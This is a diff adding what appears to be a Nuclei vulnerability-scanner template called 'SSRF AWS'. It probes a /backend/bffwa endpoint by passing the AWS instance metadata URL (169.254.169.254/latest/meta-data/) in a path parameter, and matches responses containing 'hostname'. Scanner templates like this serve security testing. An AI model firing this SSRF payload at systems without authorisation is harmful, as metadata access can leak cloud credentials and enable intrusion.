@@ -1,0 +1,22 @@
+id: ssrf-aws
+info:
+  name: SSRF AWS
+  author: vk
+  severity: P1 lelo
+  description: SSRF vulnerabilities using /backend/bffwa?path= parameter
+  references:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://cwe.mitre.org/data/definitions/918.html
+requests:
+  - method: GET
+    path:
+      - "/backend/bffwa"
+    parameters:
+      path:
+        - "http://169.254.169.254/latest/meta-data/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "hostname"
